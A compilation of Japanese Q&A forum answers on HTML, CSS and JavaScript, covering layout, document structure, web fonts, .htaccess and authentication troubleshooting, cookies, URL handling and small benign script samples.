*/ } ul#nav li{ display:inline-block; width:25%; position:relative;/* 以下の位置やサイズの基準にするため */ } ul#nav li a{ display:block;/* スマホやタブレットで扱いやすいようブロック */ width:100%;height:100%;/* サイズはliに合わせる */ text-decoration:none;/* 下線は消す */ background-color:yellow; } ul#nav li a:before{ content:attr(title); position:absolute; top:2em;left:0; } ul#nav li a:hover{ background-color:orange; } ul#nav li a[href="http://***.com/index.html"]{ font-weight:bold; } 1) display:inline-block;にしても、<p>というブロック要素が残ると・・ 　　ul#nav li{display:inline;}とすればそれは防げるが、今度は改行されない(^^) 　単純にマークアップしておけば、どんなにもデザインでき、デザインの幅が広がります。最初からデザインを目的にHTMLを書いたらダメなのですよ。下記ページをIEやfirefoxのような代替スタイルシートを利用できるブラウザで訪問して、[表示]→[スタイル]と進み、色々なスタイルを選択して見たり、印刷プレビューで印刷を確認して御覧なさい。 ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　HTMLは、まったく文書構造しか書かれていないのでメンテナンスが楽なのが分かると思います。そんな簡単なHTMLだから、スタイルは自在に変更できる。 作成方法 1) 文書構造だけをHTMLで正確にマークアップする。 2) Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html )のDATA入力などでHTMLが正しいかチェックする。 3) 文書構造に基づいてスタイルシートを書く ★色々検索し　下記記述があったので　いざ　試そうとしましたが　 ulをtext-align: center; 　これは間違いです。以前の古いIEはバグでそうでしたが、標準では、margin-left:auto;margin-right:auto;で中央に寄せます。IEはコレができなかった。 　いずれにしても最初にする事は 1) 文書構造だけをHTMLで正確にマークアップする。 　仕様書( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )をまず眼を通して、何がどこに書かれているかくらいは理解して置くこと。 　最も正確で正しい情報です。ウェブや書籍では嘘のほうが多い。なぜな、仕様書を読めば正確に書かれている事を、わざわざ書くのは仕様書の存在を知らないからです。もしくは理解できてない。
例えばこれを http://www.coach.com/myfirstcoach.html#opi221923 … <li><a class="iframe" href="http://www.coach.com/myfirstcoach.html#opi221923 … src="img/img_1.jpg"></a></li> こうしてしまえばいいと思いますが、悩んでることと一致します？ 二つの悩みはおなじ考えです。 特定のページへつなげたいなら、そのページのURLをそっくりそのまま 貼り付けておけばいいです。
まったく意味が分からないのですが・・ 異なるリンク先に進めば、それか表示されるだけですから ＞選択したリンクによって次のページの表示する内容を変更したいです。 　次のページの内容が異なれば変わるのでは？？ ＞htmlでプログラムを書いているのですが、 　HTML(大文字)はプログラム言語ではなく、マークアップ言語で、メタ言語です。プログラムはできません。 ＞JSを使ってのデータベース 　JavaScriptのことだと思いますが、使用しているパソコン内部のデータ--ローカルファイルへのアクセスなら兎も角（それでも最近はロックがかかる）、そもそもJavaScriptは？？ 　サーバー側で処理する方が楽ですよ。たとえばCGIでQeryString、PathInfo、あるいは標準入力を使えば簡単です。
font-weight:800} と閉じるか font-weight:800; } とセミコロンを入れるか・・ スタイルシートを、 W3C CSS 検証サービス( http://jigsaw.w3.org/css-validator/#validate_by_ … ) でチェックして見る。 なおウェブ開発だと開発ツール( https://addons.mozilla.org/ja/firefox/extensions … )が豊富でウェブ標準に近いfirefoxをお使いだと思いますが、そのアドオンのfirebugを使えば適用されていないスタイルも分かるかと・・
ユーザーエージェントとサーバーとの情報のやり取りには、Query String、PATH Info、標準入力、cookieなどがあります。 　どれを使っても良いのですが、この場合はcookieを使うのが順当でしょう。Query Stringや標準入力でも良いのですが、ユーザーの途中退場や再会にも対処するならcokieを使うのが良いでしょう。 　cookieは同名のcokieが発行されると上書きされますから、cokieを受け取ったら、訪問したページのリストを作成し、そのページの物がなければ追加していけば良い。 　cookieの解析自体はformで送られて来るデータ解析と基本的には同じです。
>ギザギザの文字では品質がいまいちです。 　それはないでしょう。(^^)ひょっとしてテキストを画像で表示している。??。それがない理由は今から１５年以上も前のTML4.01の勧告(1999年)以来 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから ・メーカー独自拡張のHTMLを使う。 ・テキストを画像に置き換えて表現する。 ・余白制御のために画像を用いる。 ・ページレイアウトの目的で表を用いる。 ・HTMLでページを作らずにプログラムに頼る。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Style Sheets in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　と強く否定されてきた事です。 >ＸＨＴＭＬ1.1でも出来るのか？ 　いまさらXHTMLなんて使わなくても・・・先祖がえり・・・ 　2008年の古い記事ですが「HTML5が持つ本当の意味 － ＠IT( http://www.atmarkit.co.jp/news/200801/25/html.html )」を読んでおかれると良いです。 >ギザギザの文字では品質がいまいちです。 >私も綺麗なギザギザのない文字でホームページを作成したい 　あなたの最も大きな誤解は、この一点に尽きるような気がします。 　HTMLとは、『HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』も全文を読んで理解してください。 　HTMLはワープロやIllustratrなど印刷物を作るための仕様ではありません。IEやFirefx,Chromeで見るだけでなく、印刷したり、視覚障害者がスクリーンリーダーで読んだり、点字端末で点字を打ち出したり、googleなどの検索エンジンが理解できる・・・それが最大の目的なのですよ。そうでなきゃ、adbe Illustratorで高解像度のページを作成して、.aiで保存すれば良い。 　てもそれじゃウェブではない。特定のOSの特定のバージョンの特定のアプリケーションでないと利用できなくなる。 　いまどき見出し要素を画像に置き換えることは、さすがにされていないと思いますが ・・・・「ギザギザの文字では品質がいまいちです。」ひょっして画像を使ってこられた。 　なら回避方法は大きな画像を縮小して表示させておく。---データ量も増えるし、ブラウザの処理時間もかかるし・・いいことないですが。 　それをおいて、テキストを画像で置き換えていない場合は、 h1{font-family:"ＭＳ Ｐゴシック",Osaka,serif;} と指定してこられたはずです。 　この場合は「ギザギザの文字」にはなりません。 　このように、ユーザーのパソコンでもっているだろうfont-family名を羅列してきました。 　しかしそれでは限定されますので、そこでフォントをウェブ上に置いて、それを利用できるようにします。 　CSS3でfnt-faceプロパティが導入されました。 >ＰＣ内臓のフォントによるのか？それともサーバーにおいてあるのか？ 　サーバーにおきます。 >フォントの指定はどうやっているのか？　ヘッド内の指定方法は？ 　フォントへのリンクをスタイルシートの前にリンクさせておきます。　 >ＣＳＳでの指定でやるのか？ 　ウェブフォントへのリンクはhead内の<link>要素で 　実際にどのフォントを使用するかは従来どおりスタイルシート内でfont-familyやfont-faceです。
HTML で可能です。 以下サンプル <script>(function(){ _ var gamedata = { _ _ first: {start:'/img/start.jpg'}, // Start 画像 _ _ times: 2, // 選んでもらう回数 _ _ pairs: [ _ _ _ {a1:'/img/a1.jpg', a2:'/img/a2.jpg'}, // 二枚の画像 _ _ _ {b1:'/img/b1.jpg', b2:'/img/b2.jpg'}, // 別の組み合わせの二枚の画像 _ _ _ // ... _ _ ], _ _ stock: [], _ _ result: [], _ _ init: function(){ this.result = [], this.stock = [this.first].concat(sort(this.pairs, this.times)); }, _ _ next: function(){ return this.stock.shift() }, _ }; _ function Q(s){ return document.querySelector(s) } _ function E(n,p){ var i, e = document.createElement(n); if(p) for(i in p) e[i]=p[i]; return e } _ function sort(a,n) { _ _ var i, j, t, x = a.slice(), s = x.length; _ _ for (i=0; i<n; i++, s--) j=Math.random()*s|0, t=x[i], x[i]=x[i+j], x[i+j]=t; _ _ return x.slice(0,n); _ } _ addEventListener('DOMContentLoaded', function(ev) { _ _ gamedata.init(); _ _ displayNext(); _ }, false); _ addEventListener('hashchange', function(ev) { _ _ var hash = ev.target.location.hash; _ _ switch (hash) { _ _ _ case '#reset': gamedata.init(); break; _ _ _ case '#start': break; _ _ _ default: gamedata.result.push(hash); _ _ } _ _ displayNext(); _ }, false); _ function displayNext() { _ _ var e = Q('.main'); _ _ while (e.firstChild) e.removeChild(e.firstChild); _ _ var o = gamedata.next(); _ _ if (o) { _ _ _ for (var i in o) Q('.main').appendChild(E('a', {href:'#'+i})).appendChild(E('img', {src:o[i],alt:i})); _ _ } else { _ _ _ var x = Q('.main').appendChild(E('ol')); _ _ _ x.style.display = 'inline-block'; _ _ _ gamedata.result.forEach(function(hash){ x.appendChild(E('li', {textContent:hash})) }); // 選んだ画像hashを一覧表示 _ _ } _ } })()</script> <a href=#reset>reset</a><section class=main></section>
会社のウェブサイトを造るのは、繁盛している事業を創設する最も重要な部分の1つです。
確認させて頂きたいのですが、何か変わったソフトやサービスやサーバーを利用していたり、あるいは、CMSやブログソフトウェアを利用していたりしますか？ ごく一般的なサーバーをレンタルして、普通に、ご自身で書かれたHTMLやCSS等を置いているだけですか？ 何か変わったものを利用していませんか？ ご自身のサイトのURL等は書かなくてもよいですが、どういう環境でやっておられるのかを書くと、的確な回答が付くかも知れません。
ローカルで見たいというのはアップ前のチェック用ということですか？ 手っ取り早いのはなんらかのhttpdを入れてローカルファイルも httpベースでみることですかねぇ・・・
ルートパスを使えばオーケーです。 https://helpx.adobe.com/jp/dreamweaver/kb/233307 … ※ここでは画像で示してますが、cssでも考え方は同じ。
ちょっと訂正 [テストしたサンプル] <th>を<td>に変更しても白線でないですが ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951&#64;hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} div.header,div.section,div.footer{width:90%;min-width:630px;max-width:900px;margin:0 auto;padding:5px;} div.section{position:relative;} /* ここから本題 */ table[summary="テスト"]{ ＿background: white; ＿border-collapse: collapse; ＿margin:2px auto; ＿width:90%; } table[summary="テスト"], table[summary="テスト"] th, table[summary="テスト"] td{ ＿border:1px solid gray; } table[summary="テスト"] th, table[summary="テスト"] td[abbr]{ background:aqua; } /* 色分け */ body{background-color:gray;} div.header{background-color:aqua;} div.section{background-color:white;} div.section div.section{background-color:transparent;} div.footer{background-color:fuchsia;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<table summary="テスト" border="1"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="1">サンプル1-1</th><td>サンプル1-2</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="2">サンプル2-1</th> ＿＿＿＿＿<td>サンプル2-2</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="3">サンプル3-1</th> ＿＿＿＿＿<td>サンプル3-2</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2015-10-16</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2015-10-17 10:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
＞特定のサイト とは？
とりあえずであれば if(this.value.match(/\W/)) this.value=this.value.replace(/\W/,'') のような処理をすればよいような気がしますが これでもreplaceした時点でカーソルが移動してしまいます ちょっと複雑ですが、以下のような処理をいれると カーソルを強制的に元の位置に戻します <script> try{ document.addEventListener('keyup',function(e){keyupfunc(e)},true); }catch(e){ document.attachEvent('onkeyup',function(e){keyupfunc(e)}); } function keyupfunc(e){ var t = (e.srcElement || e.target); var v=t.value; var r = new RegExp("\\W"); if(t.nodeName!="INPUT" || t.type!="text" || t.name!="text") return true; if(window.getSelection){ window.getSelection(); var p = t.selectionStart; if(v.match(r)){ t.value=v.replace(r,""); t.setSelectionRange(p-1,p-1); } }else{ //IE対策 var range = document.selection.createRange(); range.moveStart("character", - v.length ); var p = range.text.length; if(v.match(r)){ t.value=v.replace(r,""); range.collapse(); range.moveEnd("character",p -1); range.moveStart("character",p -1); range.select(); } } } </script> <input type="text" name="text" value="">
パーマリンクのパスで、.htaccess 記述で切り分ければいいだけとちがいます？
おそらくそれは、 HTML 構造を分かりやすくするためのメモとして、 慣習的に書かれている「閉じタグコメント」です。 意味としては、以下の HTML の場合ならば 開きタグ <div class=doc> の閉じタグであることを明記しています。 <div class=doc> .. <div id=foo> .. .. なんか色々な内容、が長々と .. </div><!--/#foo--> .. <div id=bar> .. .. やはり色々な内容、が長々と .. </div><!--/#bar--> </div><!--/.doc--> 要素内に内容が長々と続いているならば、読む側としてはありがたいコメントです。 ただ、最近は良い開発用ツールが使えるので、コメントが無くても構造が把握できます。 コーディング基準として書くことが決まっているならともかく、 今後はもう書く必要性は無いでしょう。
OSが変わってもログインのIDとパスワードが変わる事はありませんから、新規登録画面は閉じて、もう一度ログイン画面に入って、IDとPWを打ち込みなおしてください 全角のままになっていませんか？大文字小文字になっていませんか？１とＬを間違っていませんか？
＞<col><col>はどう言う動作をするのでしょうか。 失礼しました IEとFirefoxはcolを使って幅を調整できるので途中までそれで書いたのですが chromeあたりがcolの幅を認識でないようだったのでthやtdの幅を直正読むことにしました なのでこのソースに関してはcolはあまり意味がありません。 タグ自体削除しても問題ありません。
ということは、.htaccessが読まれてないと言うことだと思います。 置き場所が悪いのでは？ドキュメントルート直下か、abcの下に置いていますか？ あと、切り分けとして、.htaccessに xxxxxx など文法的にエラーなものを書いてみてください。 Internal Servrr Errorになれば正常です。
「シーサーブログ Googleアドセンス」で検索すると多くの具体例が出てくると思いますが 例えば下記のページをご覧下さい。 http://sonoyama.org/trendaffiliate-academy/seesa … 「コンテンツHTML編集」をクリックし、コードを貼り付けてみるといかがでしょうか？ http://sonoyama.org/trendaffiliate-academy/wp-co …
ウェブは、URIでデータのアドレスを示します。 http：//hoge.com/abc/efg?abc=efg#hij 1) http: はHTTPプロトコルという接続方法を 2) // はインターネット 3) hoge.com はHTTPサーバーの名前 4) /以降？まではパス情報です。 　★/は、ディレクトリを示すものではありません。 5) ?以降はQUERY_STRINGと呼ばれるサーバーに情報を渡す手段です。 6) #は送られてきたデータの特定の位置を示します。 4)のパス情報(PATH_INFO)は、サーバーに渡されます。通常はwindowsの\のフォルダーのようにディレクトリを示しますが、それもあくまでサーバーに渡されるPATH_INFOという情報に過ぎません。 　サーバーが、それをどう解釈するかは、要求者である我々には一切分かりません。 http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/html1 … というURIの場合は、「リンクの外れたテキストだけのページ」ではありませんね。拡張子はgifになっていますが、それも関係ない。 上記のURLの末尾を http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/html1 … としたって ＞/の有無は？ 　それは、サーバーの方針でどうにでもなるので分かりません。 http：//hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/html123/hoge.gif/?test=html123##form_check 　一般的には、次のように処理されます。 1) QUERY_STRING を環境変数に渡します。 　　ENV{'QUERT_STRING'}=test=html123 2) /Iruka/ENV_FORM.cgi/html123/hoge.gif/ 　　/ENV_FORM.cgi/html123/hoge.gif/ 　　というディレクトリを探します。 　a)存在すると 　　DIRECTORY_INDEXで指定されているファイルを探す。 　　　見つかればそれを提供する。 　　それがない場合は、 　　　・そこにあるファイル一覧を表示する。 　　　・または何もせず(3)へ 3) / をPATH情報に格納して/ENV_FORM.cgi/html123/内でhoge.gifを探す。 　a) hoge.gif を探し見つかればそれを提供する。 　b) ない場合は、 4) foge.gif をPATH情報に格納して/ENV_FORM.cgi/内でhtml123を探す。 　ENV{'PATH_INFO'}=html123/hoge.gif/ になる。 この単純作業をサーバーのルートまでたどって、最終的に何もないと、指定されたエラーを表示します。初期設定ではNOTFOUNDが返されますが、任意のページを表示することも可能。 ★また途中で見つかったファイルが実行ファイルの場合は処理がそのプログラムに引き渡されて実行した結果が返されます。 　パス情報でDIRECTORY_INDEXで、ファイルが指定されている場合は、URL欄に見えない場合があります。 　新聞社の膨大なページはその典型で、 http://www.yomiuri.co.jp/national/20150911-OYT1T … 　のアドレスはまったく実在もしないし、処理プログラムのファイル名も表面に現われていません。20150911-OYT1T50089.htmlというHTMLは実在していません。 ★ウェブの基本中の基本ですから覚えておくと色々と使えます。
＞自分の中で解決したいのです。 　サーバー管理ツールが提供されていたら、アクセスログをダウンロードして解析する。 　CGIが使えなければ基本的に無理です。 このように取得できる情報はありますが、 http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/test/ … 　拡張子は一切関係ありません。
「初歩的な」以前の問題のようです。 ・自分で[ウェブページ]を作っているのですが、HTMLで作成して ということ。 　ホームページとは本来ブラウザを起動した時に最初に表示されるページ 　ホームとは「野球のホームベース」「ゴーホーム」「ホームポジション」で基点、出発点、故郷・・と言う意味、ハウスとは違う。 　.htmlは単なる拡張子で、windowsに頭が置かされると、単なるファイル名の一部である拡張子とファイル形式が同じ物と誤解する。 　HTML(Hyper Text Markup Language)は、この言語の書式です。頭文字なので大文字で書かなくてはならない。 　それをどう処理するかは、拡張子や拡張子の有無に関係なく、サーバーからの応答ヘッダに依存する。.jpegだろうが.cgiだろうがHTMLとして処理される。 ＞ページの最後の方にお問い合わせフォームを入れたので、拡張子を.phpに変えた 　フォームはサーバーにデータを渡す手段ですから、拡張子は一切関係ない。.htnlだろうが、.gifだろうが・・ ＞.htaccessでphpをhtmlで動くようにもしてみた 　それだとPHPが動作しない。
http://kasegoo.info/keni6/2063/ の「テーマ編集でソース上に設置する方法」で 画像付き（バージョンは6.1ですが）のドンピシャな説明がしてあるようです。 画像の黄色い部分のどちらかにコードをペーストします。 私の回答では「一般的には</body>の直前に貼ります」と言いましたが、 上記のリンク先で説明があるように、 <body>～</body>内であればアクセス解析は有効になります。 設定が完了したら ブラウザのソース表示機能などを利用して コードがしっかりと表示されているか確認してみるといいと思います。
AuthUserFileのパスはあっていますか？ たぶん個人サイトでレンタルサーバー使ってますよね？ 大体、FTPで見えているパスと実際のサーバー上のディレクトリパスって異なる場合が多いです。 私も自分のサイトにベーシック認証かけるとき、最初このパスを知るために、使っているレンタルサーバーのサイトFAQやら掲示板をめちゃくちゃ探しました。 あと.htpasswdのパスワードの記述は暗号化で書いてますか？
Dreamweaverをお使いだと思いますが、そのようなWebオーサリングツール( https://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83 … )を使うには、HTMLやCSSに関する基礎的な知識がないと使えません。少なくともテキストエディタで作り上げられる程度の知識は必要です。HTMLやCSSの知識がなくてもウェブページができると誤解されている人がいますが、残念ながら逆です。ツールはあくまで「補助ツール」ですから。 　説明が必要なので少し長いですが今後のためにもしっかり読んでおいてください。 ＞ヘッダー領域（会社のロゴやお問い合わせのバナーが入ります）、ナビ領域、メイン画像、フッター領域 　まず、根本的に思い違いされている部分です。 　オーサリングツールを、あたかもワープロやDTP( https://ja.wikipedia.org/wiki/DTP )のひとつだと誤解されてきた。初学者が決して踏み込んではならない脇道を進んでこられたのだと思います。 　HTMLは、文書構造だけをタグを使ってマークアップする言語であってデザインとは無縁なものです。デザインはスタイルシートで行います。 ★構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) HTML 『ヘッダー(ロゴや問合せバナー、グローバルなナビゲーションを含む）、セクション(本文)、フッター』を含む文書を スタイルシート 『すべて、画面幅一杯に表示したい』 と言うことです。 wrapperなんて使ってはなりません。 　16年前(1999年)に勧告されたHTML4.01では、デザインのためにタグが使われてきた反省から・・『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』となりました。 　HTML5では、それすら守られなかったために、文書構造を示す要素が用意されて、原則DIVは使えなくなりました。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから NOTE: Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of more appropriate elements instead of the div element leads to better accessibility for readers and easier maintainability for authors. ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで [4.4 Grouping content — HTML5]( http://www.w3.org/TR/html5/grouping-content.html … )より 訳) 著者には、他により適切な要素がないときの最後の要素としてdiv要素を使うことが強く推奨される。div要素のかわりに、より適切な要素を使用することは読者にはより良いアクセシビリティを作者には簡単な保守性に繋がる。 　通常は<body>がheader,section,footerを含みますので不要ですが、内部にheader,section,footerを含む一連の記事が複数あるときはarticleを使うべきです。 HTML5の例 <body> 　<header> 　　<nav>サイト全体のものならheader内</nav> 　</header> 　<section> 　　<article><!-- 記事article --> 　　　<header></header> 　　　<section></section> 　　　<footer></footer> 　　</article> 　　<nav>本文の目次ならここ</nav> 　</section> 　<footer></footer> </body> HTML4.01でしたら、header,section,footerなどは<div class="header">となる。複数存在しうるのでclassでしょうね。 HTML5の例ですが、こんな簡単な物になります。HTML4.01の場合は<div class="header">など ★タブは＿に置換してあるので戻す。文字コードはUTF-8です。 ★最初にデザインは一切考えずに文書構造だけをマークアップする。 ★文書構造を見てスタイルシートを書く。 　例) header nav{text-align:center;} 　　　header内のnavは、テキストは中央ぞろえ 　　残念ながら、DWに限らず、これはツールには不可能 　　--ツールには文章を読んで理解する能力はなので-- ★幅は分かりやすくするために最大幅max-width:800px;にしてありますので、この行を消すとディスプレイ幅に関わらず全幅になります。 　なお、このデザインは印刷には適用されません。 <!doctype html> <html> <head> ＿<meta charset="utf-8"> ＿<title>サンプル</title> ＿<meta name="description" content=""> ＿<meta name="author" content="IRUKA"> <style media="screen"> <!-- body{margin:0;padding:0;} h1,h2,h3,p,ul{margin:0;line-height:1.7em;} p{text-indent:1em;} header,section,footer{ width:100%; max-width:800px;/* 分かりやすくするため最大幅を指定しておく */ margin:0 auto; position:relative; } header h1 img{width:100%;height:auto;} header nav ul{text-align:center;} header nav ul li{list-style-type:none;display:inline-block;width:5em;} p#form{text-indent:0;width:5em;position:absolute;right:20px;top:10px;} section{ min-height:400px; } section h2,section p{ margin-left:210px; } section nav{width:200px;position:absolute;top:0;left:0;height:100%;} /* 分かりやすくするため色をつける */ html{background-color:gray;} body{background-color:silver;} header{background-color:aqua;} section{background-color:white;} nav{background-color:yellow;} aside{background-color:lime;} footer{background-color:orange;} section nav{background-color:fuchsia;} --> </style> </head> <body> ＿<header> ＿＿<h1 id="title"><img src="./images/Logo.jpg" width="860" height="80" alt="会社名"></h1> ＿＿<nav> ＿＿＿<ul> ＿＿＿＿<li><a href="#">Some</a></li> ＿＿＿＿<li><a href="#">navigation</a></li> ＿＿＿＿<li><a href="#">links</a></li> ＿＿＿</ul> ＿＿</nav> ＿＿<p id="form">問い合わせ</p> ＿</header> ＿<section> ＿＿<h2>A smaller heading</h2> ＿＿<p> ＿＿＿DWを使う場合も、ひたすら文書構造だけをマークアップし、必要ならclassで文書構造を補完しておく。 ＿＿</p> ＿＿<p> ＿＿＿その後、スタイルシートでデザインをしていきますが、DWに限らずツールには文書構造からセレクタを記述する能力はありませんので、ここだけは自分で。 ＿＿</p> ＿＿<nav> ＿＿＿<h3>本文目次</h3> ＿＿</nav> ＿</section> ＿<footer> ＿＿<h3>A nice footer</h3> ＿</footer> </body> </html>
<img src="1.png" onclick="this.src='2.png'"> でどうでしょうか？ 私のIE11では動きました。
ご回答いただきまして、ありがとうございます。素人が作成したもので、おかしなところがいっぱいです… もう少し勉強します。
html のみで実現する方法 <script> window.addEventListener('DOMContentLoaded',function(ev){ var action = function(ev){ ev.preventDefault(); var form = ev.currentTarget, display = form.querySelector('.display'); while (display.firstChild) display.removeChild(display.firstChild); var A = function(a){return Array.prototype.slice.apply(a)}; var convert = function(elem){ var text = elem.value; return text.length>0? 'uploaded' + text + '.gif': null }; var makeImage = function(src){var m=document.createElement('img'); m.src=src; display.appendChild(m)}; A(form.elements['n']).map(convert).filter(function(v){return v != null}).forEach(makeImage); }; var form = document.forms['addimg']; form.addEventListener('change', action, false); form.addEventListener('submit', action, false); },false); </script> <form name=addimg> <ul> <li><input type=text name=n> <li><input type=text name=n> <li><input type=text name=n> <li><input type=text name=n> <li><input type=text name=n> <li><input type=text name=n> </ul> <div class=display></div> </form>
No.3です。 ＞このダミーはなんでもいいんですか？ ＞p=1111とか適当で。 {パラメータ名}={値}の形式であれば何でも大丈夫です。 一般的にはパラメータをvar,v,update,upなどにすることが多く、値はそのファイルを更新した日時（20150825,20150824150000）にすることが多いです。 ＞それをつけるだけで、CCS、jsを最新のを取得してくれるんですか？ URLではパラメータまでを含めてリソースのロケーション（位置）とみなします。 なので、Web上では下記の２つは違うファイルとみなされます。 　http://www.hoge.com/aaa/box.css?a=123 　http://www.hoge.com/aaa/box.css?a=234 （ざっくり言うと○○区△△町1丁目、○○区△△町2丁目の違いですね） キャッシュはURLに対して作成されるため、ダミーのパラメータを付与することにより 　URLが違う 　↓ 　そのURLに対するキャッシュはまだ存在しない 　↓ 　新しくファイルを取得し、キャッシュを作成する という挙動になります。 以降、そのURLがリクエストされるとキャッシュがすでにあるため、そちらを利用する、 という仕組みです。 ご参考になれば幸いです。
私の環境（Windows7 Firefox NTT東日本フレッツ光）では反映されてます。 ずいぶんと複雑な構造のようですが、 まずは簡単な内容で試してみてからの方が良いと思います。 切り分けが簡単ですから。
＞HTML５とCSS3に関するおすすめの本があったら教えていただけないでしょうか？ 　これがとても難しい。理由は ・進歩の激しいこの世界、出版時には古くなっている ・すべて仕様書に書かれている。それで事足りる物を書き下す意味がない。 　仕様書には、「なぜそうするのか」の理由も含めて完璧に書かれている。 　それを読めば解決する物を、著者の色眼鏡を通して記述しても正確ではない 　しばしば、仕様書を読んだことがあるのか疑問のものがある。 　これについては、No.1でいくつか説明しました。 　よって、一番早くて、しかも正確な参考書は仕様書ということになります。私もHTMLやCSSは仕様書で学びました。 　最初は冗長に感じますが、それは正確性を追求するために致し方ないでしょう。 　まずはHTMLをしっかり学ばれることをお勧めします。いきなり膨大なHTML5ではなく、HTML4.01strict【strictですよ。】を身につけてから、HTML5に進まれるほうが楽でしょう。 1.2 仕様の記述法( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )より 　本仕様書は、著者及び実装者という2種類の読者を想定している。著者である読者に対しては、本仕様書が、HTMLの実装詳細に必要以上に触れずに使える、効率的・魅力的でアクセス性のよい文書を著述する際に必要な道具となることを望む。けれども実装者である読者は、仕様に適合するユーザエージェントを作成する上で必要となるすべての情報を見つけることができるだろう。 　本仕様書は様々な方法で利用できるだろう。 ・ 最初から最後まで通読する。 ・ 必要な情報に直接アクセスする。 　最初は、全体を通して読んで全体像を把握して、いつでも必要な情報にたどり着けるようになること。 　私のブックマークでは HTML4.01詳細目次( http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … ) 　ついで、スタイルシートはやはりCSS2.1あたりがベストです。 CSS 2.1目次( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　特に 4 構文と基本データ型 5 セレクタ 6 プロパティ値とカスケーディング、継承の割り当て 　ここを読まれるだけで、あなたが理解しているCSSが如何に不完全か理解できると思います。 　そのうえで、 HTML4からの変更点( http://www.html5.jp/trans/w3c_differences.html ) 　で、変更部分を身につけるのが最も最短で効率的でしょう。 ★HTMLやCSSの学習は、数学や理科の勉強方法ととても良く似ています。基礎から順を追ってなぜなのかを理解しながら学ぶと、小学生でも数検2級とかが取れるように、簡単なものなのです。結果を急いでうわべだけ学ぼうとしても反って時間と労力を無駄にして、しかもきちんと身についていないから応用問題に果ても足も出ない・・・ということになる。
どこでも良いです。 <a href="http://.com/" target="_blank" title="AAA" rel="nofollow">BBB</a>
まぁあまり深く考えず 「$_COOKIEに収まっているデータはブラウザに保存されているデータ」 と考えればすむかと。 どうしてもphp上で一致させたいなら setcookie("cake", $val); した直後に $_COOKIE["cake"]=$val; すればよいかと思いますが、ロジックがぶれるのであまりお勧めできません。
その程度ならブックマークレット方式で実現できます。 javascript:(function(elem){var A=function(a){return Array.prototype.slice.apply(a)},S=function(s){return A(elem.querySelectorAll(s))},G=function(s){return /\b(je?pg|png|gif)\b/.test(s)},Q=function(v,i,s){return s.indexOf(v)==i},M=function(u){return '<a href="@"><img src="@"></a>'.replace(/@/g,u)},T=function(x){return A(x.childNodes).filter(function(e){return e.nodeType==3}).map(function(e){return e.nodeValue}).join(' ')},R=function(p,v){var m,re=/\bh?ttps?:\/\/[^\s'",]+/g;while((m=re.exec(v)))p.push(m[0]);return p},a=S('*').concat(elem).map(T).reduce(R,[]).filter(G).filter(Q).map(M).join(' '),b=S('img[src]').map(function(e){return e.src}).filter(Q).map(M).join(' '),c=S('a[href]').map(function(e){return e.href}).filter(G).filter(Q).map(M).join(' ');window.location.href='data:text/html;base64,'+btoa('<style>img{max-width:3em;max-height:3em;}</style><p>embed:'+a+'<p>image:'+b+'<p>anchor:'+c)})(document.body)
